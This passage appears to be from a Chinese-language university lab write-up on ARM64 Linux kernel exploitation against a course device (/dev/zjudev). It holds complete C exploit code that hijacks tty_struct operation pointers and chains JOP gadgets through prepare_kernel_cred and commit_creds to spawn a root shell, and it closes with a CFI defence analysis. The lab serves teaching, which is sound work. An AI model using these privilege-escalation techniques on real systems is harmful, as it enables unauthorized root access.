+</span><span class=lnt>32
+</span><span class=lnt>33
+</span><span class=lnt>34
+</span><span class=lnt>35
+</span><span class=lnt>36
+</span><span class=lnt>37
+</span><span class=lnt>38
+</span><span class=lnt>39
+</span><span class=lnt>40
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=cp>#define TTY_STRUCT_SIZE 0x2B8
+</span></span></span><span class=line><span class=cl><span class=cp>#define TTY_MAGIC 0x5401
+</span></span></span><span class=line><span class=cl><span class=cp></span>
+</span></span><span class=line><span class=cl><span class=cp>#define HACK_CRED_ADDR 0xffff80001083aa84
+</span></span></span><span class=line><span class=cl><span class=cp></span>
+</span></span><span class=line><span class=cl><span class=kt>size_t</span> <span class=n>tty_op_buf</span><span class=p>[</span><span class=mi>36</span><span class=p>];</span>
+</span></span><span class=line><span class=cl><span class=kt>char</span> <span class=n>tty_buf</span><span class=p>[</span><span class=n>TTY_STRUCT_SIZE</span><span class=p>];</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=kt>void</span> <span class=nf>exp_task2</span><span class=p>(</span><span class=kt>int</span> <span class=n>dev_fd</span><span class=p>,</span> <span class=kt>int</span> <span class=n>ptmx_fd</span><span class=p>)</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>    <span class=nf>printf</span><span class=p>(</span><span class=s>&#34;Jump into exp_task2!</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>    <span class=c1>// 创建tty_op_buf，将其中的函数指针都修改为HACK_CRED_ADDR
+</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=k>for</span> <span class=p>(</span><span class=kt>size_t</span> <span class=n>i</span> <span class=o>=</span> <span class=mi>0</span><span class=p>;</span> <span class=n>i</span> <span class=o>&lt;</span> <span class=mi>36</span><span class=p>;</span> <span class=o>++</span><span class=n>i</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>        <span class=n>tty_op_buf</span><span class=p>[</span><span class=n>i</span><span class=p>]</span> <span class=o>=</span> <span class=n>HACK_CRED_ADDR</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>    <span class=kt>char</span> <span class=n>my_buf</span><span class=p>[</span><span class=mi>32</span><span class=p>];</span>
+</span></span><span class=line><span class=cl>    <span class=kt>size_t</span> <span class=n>ptr</span> <span class=o>=</span> <span class=p>(</span><span class=kt>size_t</span><span class=p>)(</span><span class=o>&amp;</span><span class=n>tty_op_buf</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>    <span class=nf>printf</span><span class=p>(</span><span class=s>&#34;ptr = %lx</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span> <span class=n>ptr</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>    <span class=nf>memcpy</span><span class=p>(</span><span class=n>my_buf</span><span class=p>,</span> <span class=n>tty_buf</span><span class=p>,</span> <span class=mi>24</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>    <span class=c1>// 修改ops指针，指向tty_op_buf
+</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=nf>memcpy</span><span class=p>(</span><span class=n>my_buf</span> <span class=o>+</span> <span class=mi>24</span><span class=p>,</span> <span class=o>&amp;</span><span class=n>ptr</span><span class=p>,</span> <span class=mi>8</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>    <span class=k>for</span> <span class=p>(</span><span class=kt>size_t</span> <span class=n>i</span> <span class=o>=</span> <span class=mi>0</span><span class=p>;</span> <span class=n>i</span> <span class=o>&lt;</span> <span class=mi>32</span><span class=p>;</span> <span class=n>i</span> <span class=o>+=</span> <span class=mi>8</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>        <span class=nf>printf</span><span class=p>(</span><span class=s>&#34;my_buf + %lu = 0x%lx</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span> <span class=n>i</span><span class=p>,</span> <span class=o>*</span><span class=p>(</span><span class=kt>size_t</span><span class=o>*</span><span class=p>)(</span><span class=n>my_buf</span> <span class=o>+</span> <span class=n>i</span><span class=p>));</span>
+</span></span><span class=line><span class=cl>    <span class=c1>// 覆写缓冲区
+</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=nf>write</span><span class=p>(</span><span class=n>dev_fd</span><span class=p>,</span> <span class=n>my_buf</span><span class=p>,</span> <span class=mi>32</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>    <span class=c1>// 检查缓冲区是否被修改
+</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=nf>printf</span><span class=p>(</span><span class=s>&#34;check ttyy_buf</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>    <span class=nf>read</span><span class=p>(</span><span class=n>dev_fd</span><span class=p>,</span> <span class=n>tty_buf</span><span class=p>,</span> <span class=n>TTY_STRUCT_SIZE</span> <span class=o>-</span> <span class=mi>1</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>    <span class=k>for</span> <span class=p>(</span><span class=kt>size_t</span> <span class=n>i</span> <span class=o>=</span> <span class=mi>0</span><span class=p>;</span> <span class=n>i</span> <span class=o>&lt;</span> <span class=mi>32</span><span class=p>;</span> <span class=n>i</span> <span class=o>+=</span> <span class=mi>8</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>        <span class=nf>printf</span><span class=p>(</span><span class=s>&#34;tty_buf + %lu = 0x%lx</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span> <span class=n>i</span><span class=p>,</span> <span class=o>*</span><span class=p>(</span><span class=kt>size_t</span><span class=o>*</span><span class=p>)(</span><span class=n>tty_buf</span> <span class=o>+</span> <span class=n>i</span><span class=p>));</span>
+</span></span><span class=line><span class=cl>    <span class=c1>// 调用close操作ptmx设备，真正调用的是hack_cred函数
+</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=nf>close</span><span class=p>(</span><span class=n>ptmx_fd</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>    <span class=nf>system</span><span class=p>(</span><span class=s>&#34;/bin/sh&#34;</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>    <span class=k>return</span><span class=p>;</span>
+</span></span><span class=line><span class=cl><span class=p>}</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=kt>int</span> <span class=nf>main</span><span class=p>(</span><span class=kt>int</span> <span class=n>argc</span><span class=p>,</span> <span class=kt>char</span><span class=o>*</span> <span class=n>argv</span><span class=p>[])</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>    <span class=kt>int</span> <span class=n>dev_fd</span> <span class=o>=</span> <span class=nf>init_dev</span><span class=p>();</span>
+</span></span><span class=line><span class=cl>	<span class=kt>int</span> <span class=n>ptmx_fd</span> <span class=o>=</span> <span class=nf>init_ptmx</span><span class=p>(</span><span class=n>dev_fd</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>    <span class=nf>exp_task2</span><span class=p>(</span><span class=n>dev_fd</span><span class=p>,</span> <span class=n>ptmx_fd</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=mi>0</span><span class=p>;</span>
+</span></span><span class=line><span class=cl><span class=p>}</span>
+</span></span></code></pre></td></tr></table></div></div><h2 id=task3gadget获取root-shell--思考题4>Task3：gadget获取root shell & 思考题4</h2><ol><li><p>在task3中我们无法直接调用<code>hack_cred</code>函数获取root权限，需要使用<code>gadget</code>，本质上就是通过<code>gadget</code>控制传参的寄存器，进而依次调用<code>struct cred* root_cred = prepare_kernel_cred(NULL)</code>和<code>commit_creds(root_cred)</code>获取root权限</p></li><li><p>我们先观察一下这几个<code>gadget</code>分别做了什么</p><ul><li><code>zju_gadget1:</code> 将 [x0 + 0x38]地址的值赋值给x1，将x2的值赋值给x0，跳转到x1储存的地址处</li><li><code>zju_gadget2:</code> 将x0置0，将[x2 + 0x28]地址的值赋值给x1，跳转到x1储存的地址处</li><li><code>zju_gadget3:</code> 直接返回</li><li>之后我们的思路就明确了，我们首先通过<code>zju_gadget3</code>获取<code>ty_struct</code>的地址，之后通过<code>zju_gadget2</code>调用<code>prepare_kernel_cred</code>方法，获取返回值，之后再调用<code>commit_creds</code>方法获取root权限</li></ul></li><li><p>首先我们需要获取<code>tyy_struct</code>的地址</p><ol><li>在之前的实验中，尽管我们可以修改<code>tyy_struct</code>结构的值，但是我们需要在之后将<code>tty_struct</code>的地址作为参数传入<code>gadget</code>，因此我们需要得到它的地址</li><li>在arm中，函数的第一个参数会保存在x0中，函数返回的值也会保存在x0中，而我们观察<code>ioctl</code>方法</li></ol><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span><span class=lnt>5
+</span><span class=lnt>6
+</span><span class=lnt>7
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=c1>// x0 = tty_struct_of_fd, x1 = p1, x2 = p2
+</span></span></span><span class=line><span class=cl><span class=c1></span><span class=kt>int</span> <span class=nf>ioctl</span><span class=p>(</span><span class=kt>int</span> <span class=n>fd</span><span class=p>,</span> <span class=kt>unsigned</span> <span class=kt>long</span> <span class=kt>int</span> <span class=n>p1</span><span class=p>,</span> <span class=kt>void</span> <span class=o>*</span><span class=n>p2</span><span class=p>)</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>    <span class=nf>ioctl_operation</span><span class=p>(</span><span class=n>tty_struct_of_fd</span><span class=p>,</span> <span class=n>p1</span><span class=p>,</span> <span class=n>p2</span><span class=p>);</span>
+</span></span><span class=line><span class=cl><span class=p>}</span>
+</span></span><span class=line><span class=cl><span class=c1>// x0 = &amp;tty, x1 = cmd, x2 = arg
+</span></span></span><span class=line><span class=cl><span class=c1></span><span class=kt>int</span>  <span class=p>(</span><span class=o>*</span><span class=n>ioctl</span><span class=p>)(</span><span class=k>struct</span> <span class=n>tty_struct</span> <span class=o>*</span><span class=n>tty</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>		    <span class=kt>unsigned</span> <span class=kt>int</span> <span class=n>cmd</span><span class=p>,</span> <span class=kt>unsigned</span> <span class=kt>long</span> <span class=n>arg</span><span class=p>);</span>
+</span></span></code></pre></td></tr></table></div></div><p>可以其会将参数按照顺序传入<code>ioctl_operation</code>，之后在<code>ioctl</code>函数指针中，第一个参数就是<code>tty_struct</code>的指针，因此x0就是<code>tty_struct</code>的起始地址</p><ol start=3><li>我们将<code>ioctl</code>方法覆写为<code>zju_gadget3</code>，<code>return</code>得到的返回值(x0)就是<code>tty_struct</code>的起始地址；需要注意由于返回值为int类型，在赋值为64bit类型变量后，需要手动将最高16位赋值为<code>0xffff</code></li></ol></li><li><p>之后我们需要调用<code>prepare_kernel_gadget</code>函数</p><ol><li>首先这个函数的参数需要是<code>NULL</code>，而<code>NULL</code>在C中就是0，因此我们可以想到利用<code>zju_gadget2</code>，同时<code>x0</code>正好作为<code>prepare_kernel_gadget</code>的第一个参数</li><li>如何调用<code>prepare_kernel_gadget</code>函数？可以发现<code>zju_gadget2</code>将[x2 + 0x28]地址的值赋值给x1，之后跳转到x1储存的地址处，那么我们就可以将<code>prepare_kernel_gadget</code>的地址放到[x2 + 0x28]</li><li>x2是可以通过<code>ioctl</code>传入的参数，也就是p2，那么我们就可以直接传入<code>tty_struct</code>的起始地址，将[addr+0x28]处的地址覆写成<code>prepare_kernel_gadget</code>的地址即可</li><li>最后将返回值保存，之后需要传入<code>commit_creds</code></li></ol></li><li><p>之后就是调用<code>commit_creds</code>，和之前一样的思路，在<code>zju_gadget1</code>中，将 [x0 + 0x38]地址的值赋值给x1，将x2的值赋值给x0，跳转到x1储存的地址处；因此我们可以通过覆写 [x0 + 0x38]地址处的值为<code>commit_creds</code>的地址对其调用，同时将<code>prepare_kernel_cred</code>的返回值作为参数传入<code>x2</code>，在<code>zju_gadget1</code>中传入<code>x0</code>，进而调用函数</p></li></ol><blockquote><p>Q4. 为什么第二步可以直接ret获取到 <code>tty_struct</code>结构体的地址？ret 执行前后的控制流是什么样的？</p></blockquote><p>根据之前的分析，当调用<code>int (*ioctl)(struct tty_struct *tty, unsigned int cmd, unsigned long arg)</code>函数签名时，第一个参数就到 <code>tty_struct</code>结构体的地址，通过x0寄存器传参；而我们实际上调用的是<code>zju_gadget3</code>，此时传参是正常的，但是在函数体中直接<code>return</code>，没有修改x0寄存器的值；而arm架构中函数的返回值也储存在x0寄存器中，函数返回值也就是 <code>tty_struct</code>结构体的地址</p><p>控制流：<code>my_function</code> -> <code>int ioctl(int fd, unsigned long int p1, void *p2)</code> -> &mldr; <code>tty_optarions.ioctl(struct tty_struct *tty, unsigned int cmd, unsigned long arg)</code> -> <code>zju_gadget3</code> -> &mldr; -> <code>my_function</code></p><p>附代码：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span><span class=lnt>18
+</span><span class=lnt>19
+</span><span class=lnt>20
+</span><span class=lnt>21
+</span><span class=lnt>22
+</span><span class=lnt>23
+</span><span class=lnt>24
+</span><span class=lnt>25
+</span><span class=lnt>26
+</span><span class=lnt>27
+</span><span class=lnt>28
+</span><span class=lnt>29
+</span><span class=lnt>30
+</span><span class=lnt>31
+</span><span class=lnt>32
+</span><span class=lnt>33
+</span><span class=lnt>34
+</span><span class=lnt>35
+</span><span class=lnt>36
+</span><span class=lnt>37
+</span><span class=lnt>38
+</span><span class=lnt>39
+</span><span class=lnt>40
+</span><span class=lnt>41
+</span><span class=lnt>42
+</span><span class=lnt>43
+</span><span class=lnt>44
+</span><span class=lnt>45
+</span><span class=lnt>46
+</span><span class=lnt>47
+</span><span class=lnt>48
+</span><span class=lnt>49
+</span><span class=lnt>50
+</span><span class=lnt>51
+</span><span class=lnt>52
+</span><span class=lnt>53
+</span><span class=lnt>54
+</span><span class=lnt>55
+</span><span class=lnt>56
+</span><span class=lnt>57
+</span><span class=lnt>58
+</span><span class=lnt>59
+</span><span class=lnt>60
+</span><span class=lnt>61
+</span><span class=lnt>62
+</span><span class=lnt>63
+</span><span class=lnt>64
+</span><span class=lnt>65
+</span><span class=lnt>66
+</span><span class=lnt>67
+</span><span class=lnt>68
+</span><span class=lnt>69
+</span><span class=lnt>70
+</span><span class=lnt>71
+</span><span class=lnt>72
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=cp>#define TTY_STRUCT_SIZE 0x2B8
+</span></span></span><span class=line><span class=cl><span class=cp>#define TTY_MAGIC 0x5401
+</span></span></span><span class=line><span class=cl><span class=cp></span>
+</span></span><span class=line><span class=cl><span class=cp>#define ZJU_GADGET_ONE_ADDR 0xffff80001083aa44
+</span></span></span><span class=line><span class=cl><span class=cp>#define ZJU_GADGET_TWO_ADDR 0xffff80001083aa5c
+</span></span></span><span class=line><span class=cl><span class=cp>#define ZJU_GADGET_THREE_ADDR 0xffff80001083aa74
+</span></span></span><span class=line><span class=cl><span class=cp>#define PREPARE_KERNEL_CRED_ADDR 0xffff8000100b6030
+</span></span></span><span class=line><span class=cl><span class=cp>#define COMMIT_CREDS_ADDR 0xffff8000100b5bac
+</span></span></span><span class=line><span class=cl><span class=cp></span>
+</span></span><span class=line><span class=cl><span class=kt>size_t</span> <span class=n>tty_op_buf</span><span class=p>[</span><span class=mi>36</span><span class=p>];</span>
+</span></span><span class=line><span class=cl><span class=kt>char</span> <span class=n>tty_buf</span><span class=p>[</span><span class=n>TTY_STRUCT_SIZE</span><span class=p>];</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=kt>int</span> <span class=nf>init_dev</span><span class=p>()</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>    <span class=kt>int</span> <span class=n>dev1</span> <span class=o>=</span> <span class=nf>open</span><span class=p>(</span><span class=s>&#34;/dev/zjudev&#34;</span><span class=p>,</span> <span class=n>O_RDWR</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>    <span class=kt>int</span> <span class=n>dev2</span> <span class=o>=</span> <span class=nf>open</span><span class=p>(</span><span class=s>&#34;/dev/zjudev&#34;</span><span class=p>,</span> <span class=n>O_RDWR</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>    <span class=nf>ioctl</span><span class=p>(</span><span class=n>dev1</span><span class=p>,</span> <span class=mh>0x0001</span><span class=p>,</span> <span class=n>TTY_STRUCT_SIZE</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>	<span class=nf>close</span><span class=p>(</span><span class=n>dev1</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>	<span class=k>return</span> <span class=n>dev2</span><span class=p>;</span>
+</span></span><span class=line><span class=cl><span class=p>}</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=kt>int</span> <span class=nf>init_ptmx</span><span class=p>(</span><span class=kt>int</span> <span class=n>dev_fd</span><span class=p>)</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>    <span class=kt>int</span> <span class=n>ptmx_fd</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>    <span class=k>for</span> <span class=p>(;;)</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>        <span class=n>ptmx_fd</span> <span class=o>=</span> <span class=nf>open</span><span class=p>(</span><span class=s>&#34;/dev/ptmx&#34;</span><span class=p>,</span> <span class=n>O_RDWR</span> <span class=o>|</span> <span class=n>O_NOCTTY</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>        <span class=nf>memset</span><span class=p>(</span><span class=n>tty_buf</span><span class=p>,</span> <span class=sc>&#39;\0&#39;</span><span class=p>,</span> <span class=k>sizeof</span><span class=p>(</span><span class=n>tty_buf</span><span class=p>));</span>
+</span></span><span class=line><span class=cl>        <span class=nf>read</span><span class=p>(</span><span class=n>dev_fd</span><span class=p>,</span> <span class=n>tty_buf</span><span class=p>,</span> <span class=n>TTY_STRUCT_SIZE</span> <span class=o>-</span> <span class=mi>1</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>        <span class=k>for</span> <span class=p>(</span><span class=kt>size_t</span> <span class=n>i</span> <span class=o>=</span> <span class=mi>0</span><span class=p>;</span> <span class=n>i</span> <span class=o>&lt;</span> <span class=n>TTY_STRUCT_SIZE</span><span class=p>;</span> <span class=n>i</span> <span class=o>+=</span> <span class=mi>8</span><span class=p>)</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>            <span class=kt>char</span> <span class=n>v_str</span><span class=p>[</span><span class=mi>9</span><span class=p>];</span>
+</span></span><span class=line><span class=cl>            <span class=nf>memcpy</span><span class=p>(</span><span class=n>v_str</span><span class=p>,</span> <span class=n>tty_buf</span> <span class=o>+</span> <span class=n>i</span><span class=p>,</span> <span class=mi>8</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>            <span class=n>v_str</span><span class=p>[</span><span class=mi>8</span><span class=p>]</span> <span class=o>=</span> <span class=sc>&#39;\0&#39;</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>            <span class=nf>printf</span><span class=p>(</span><span class=s>&#34;tty_buf + %lu = 0x%lx</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span> <span class=n>i</span><span class=p>,</span> <span class=o>*</span><span class=p>(</span><span class=kt>size_t</span><span class=o>*</span><span class=p>)</span><span class=n>v_str</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>        <span class=p>}</span>
+</span></span><span class=line><span class=cl>        <span class=kt>size_t</span> <span class=n>magic</span> <span class=o>=</span> <span class=mi>0</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>        <span class=nf>memcpy</span><span class=p>(</span><span class=o>&amp;</span><span class=n>magic</span><span class=p>,</span> <span class=n>tty_buf</span><span class=p>,</span> <span class=mi>4</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=p>(</span><span class=n>magic</span> <span class=o>==</span> <span class=n>TTY_MAGIC</span><span class=p>)</span> <span class=k>break</span><span class=p>;</span> 
+</span></span><span class=line><span class=cl>        <span class=nf>printf</span><span class=p>(</span><span class=s>&#34;</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>    <span class=p>}</span>
+</span></span><span class=line><span class=cl>    <span class=nf>printf</span><span class=p>(</span><span class=s>&#34;TTY_MAGIC match! ptmx_fd = %d</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span> <span class=n>ptmx_fd</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>ptmx_fd</span><span class=p>;</span>
+</span></span><span class=line><span class=cl><span class=p>}</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=kt>void</span> <span class=nf>exp_task3</span><span class=p>(</span><span class=kt>int</span> <span class=n>dev_fd</span><span class=p>,</span> <span class=kt>int</span> <span class=n>ptmx_fd</span><span class=p>)</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>    <span class=nf>printf</span><span class=p>(</span><span class=s>&#34;Jump into exp_task3!</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>    <span class=nf>memset</span><span class=p>(</span><span class=n>tty_op_buf</span><span class=p>,</span> <span class=sc>&#39;\0&#39;</span><span class=p>,</span> <span class=k>sizeof</span><span class=p>(</span><span class=n>tty_op_buf</span><span class=p>));</span>
+</span></span><span class=line><span class=cl>    <span class=kt>char</span> <span class=n>my_buf</span><span class=p>[</span><span class=mh>0x40</span><span class=p>];</span>
+</span></span><span class=line><span class=cl>    <span class=kt>size_t</span> <span class=n>ptr</span> <span class=o>=</span> <span class=p>(</span><span class=kt>size_t</span><span class=p>)(</span><span class=o>&amp;</span><span class=n>tty_op_buf</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>    <span class=kt>size_t</span> <span class=n>prepare_kernel_cred_addr</span> <span class=o>=</span> <span class=n>PREPARE_KERNEL_CRED_ADDR</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>    <span class=kt>size_t</span> <span class=n>commit_creds_addr</span> <span class=o>=</span> <span class=n>COMMIT_CREDS_ADDR</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>    <span class=nf>memcpy</span><span class=p>(</span><span class=n>my_buf</span><span class=p>,</span> <span class=n>tty_buf</span><span class=p>,</span> <span class=mh>0x40</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>    <span class=nf>memcpy</span><span class=p>(</span><span class=n>my_buf</span> <span class=o>+</span> <span class=mi>24</span><span class=p>,</span> <span class=o>&amp;</span><span class=n>ptr</span><span class=p>,</span> <span class=mi>8</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>    <span class=nf>memcpy</span><span class=p>(</span><span class=n>my_buf</span> <span class=o>+</span> <span class=mh>0x28</span><span class=p>,</span> <span class=o>&amp;</span><span class=n>prepare_kernel_cred_addr</span><span class=p>,</span> <span class=mi>8</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>    <span class=nf>memcpy</span><span class=p>(</span><span class=n>my_buf</span> <span class=o>+</span> <span class=mh>0x38</span><span class=p>,</span> <span class=o>&amp;</span><span class=n>commit_creds_addr</span><span class=p>,</span> <span class=mi>8</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>    <span class=nf>write</span><span class=p>(</span><span class=n>dev_fd</span><span class=p>,</span> <span class=n>my_buf</span><span class=p>,</span> <span class=mh>0x40</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>    <span class=n>tty_op_buf</span><span class=p>[</span><span class=mi>12</span><span class=p>]</span> <span class=o>=</span> <span class=n>ZJU_GADGET_THREE_ADDR</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>    <span class=kt>size_t</span> <span class=n>tty_addr</span> <span class=o>=</span> <span class=nf>ioctl</span><span class=p>(</span><span class=n>ptmx_fd</span><span class=p>,</span> <span class=mh>0x0</span><span class=p>,</span> <span class=mh>0x0</span><span class=p>)</span> <span class=o>|</span> <span class=mh>0xffff000000000000</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>    <span class=nf>printf</span><span class=p>(</span><span class=s>&#34;tty_addr = 0x%lx</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span> <span class=n>tty_addr</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>    <span class=n>tty_op_buf</span><span class=p>[</span><span class=mi>12</span><span class=p>]</span> <span class=o>=</span> <span class=n>ZJU_GADGET_TWO_ADDR</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>    <span class=n>commit_creds_addr</span> <span class=o>=</span> <span class=nf>ioctl</span><span class=p>(</span><span class=n>ptmx_fd</span><span class=p>,</span> <span class=mh>0x0</span><span class=p>,</span> <span class=n>my_buf</span><span class=p>)</span> <span class=o>|</span> <span class=mh>0xffff000000000000</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>    <span class=nf>printf</span><span class=p>(</span><span class=s>&#34;commit_creds_addr = 0x%lx</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span> <span class=n>commit_creds_addr</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>    <span class=n>tty_op_buf</span><span class=p>[</span><span class=mi>12</span><span class=p>]</span> <span class=o>=</span> <span class=n>ZJU_GADGET_ONE_ADDR</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>    <span class=nf>ioctl</span><span class=p>(</span><span class=n>ptmx_fd</span><span class=p>,</span> <span class=mh>0x0</span><span class=p>,</span> <span class=n>commit_creds_addr</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>    <span class=nf>system</span><span class=p>(</span><span class=s>&#34;/bin/sh&#34;</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>    <span class=k>return</span><span class=p>;</span>
+</span></span><span class=line><span class=cl><span class=p>}</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=kt>int</span> <span class=nf>main</span><span class=p>(</span><span class=kt>int</span> <span class=n>argc</span><span class=p>,</span> <span class=kt>char</span><span class=o>*</span> <span class=n>argv</span><span class=p>[])</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>    <span class=kt>int</span> <span class=n>dev_fd</span> <span class=o>=</span> <span class=nf>init_dev</span><span class=p>();</span>
+</span></span><span class=line><span class=cl>	<span class=kt>int</span> <span class=n>ptmx_fd</span> <span class=o>=</span> <span class=nf>init_ptmx</span><span class=p>(</span><span class=n>dev_fd</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>    <span class=nf>exp_task3</span><span class=p>(</span><span class=n>dev_fd</span><span class=p>,</span> <span class=n>ptmx_fd</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=mi>0</span><span class=p>;</span>
+</span></span><span class=line><span class=cl><span class=p>}</span>
+</span></span></code></pre></td></tr></table></div></div><h2 id=task4内核cfi保护>Task4：内核CFI保护</h2><ul><li>使用<code>objdump</code>反汇编开启CFI的内核镜像 <code>vmlinux</code>，获得汇编代码，提交任意一个间接调用的汇编代码，并详细解释CFI是如何防御JOP攻击</li></ul><p>我们分别在开始CFI和没开启CFI的vmlinux镜像中反汇编<code>tty_driver_flush_buffer</code>函数，关键代码如下</p><p>CFI:</p><p><img src=/p/jop/image-20230606211049596.png width=848 height=596 srcset="/p/jop/image-20230606211049596_hud77ec3916f7c82eec330fd73c791f067_108082_480x0_resize_box_3.png 480w, /p/jop/image-20230606211049596_hud77ec3916f7c82eec330fd73c791f067_108082_1024x0_resize_box_3.png 1024w" loading=lazy alt="image 2" class=gallery-image data-flex-grow=142 data-flex-basis=341px></p><p>NoCFI:</p><p><img src=/p/jop/image-20230606211100002.png width=747 height=241 srcset="/p/jop/image-20230606211100002_hu19cd443c31c154b6bee5b0227d1a82f3_33401_480x0_resize_box_3.png 480w, /p/jop/image-20230606211100002_hu19cd443c31c154b6bee5b0227d1a82f3_33401_1024x0_resize_box_3.png 1024w" loading=lazy alt="image 3" class=gallery-image data-flex-grow=309 data-flex-basis=743px></p><p>关注如下片段：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span><span class=lnt>5
+</span><span class=lnt>6
+</span><span class=lnt>7
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>ffff800008bd9594:	b4000108 	cbz	x8, ffff800008bd95b4 &lt;tty_driver_flush_buffer+0x38&gt;
+</span></span><span class=line><span class=cl>ffff800008bd9598:	d00061c9 	adrp	x9, ffff800009813000 &lt;regulator_get_current_limit.cfi_jt&gt;
+</span></span><span class=line><span class=cl>ffff800008bd959c:	912d0129 	add	x9, x9, #0xb40
+</span></span><span class=line><span class=cl>ffff800008bd95a0:	cb090109 	sub	x9, x8, x9
+</span></span><span class=line><span class=cl>ffff800008bd95a4:	93c90d29 	ror	x9, x9, #3
+</span></span><span class=line><span class=cl>ffff800008bd95a8:	f100a93f 	cmp	x9, #0x2a
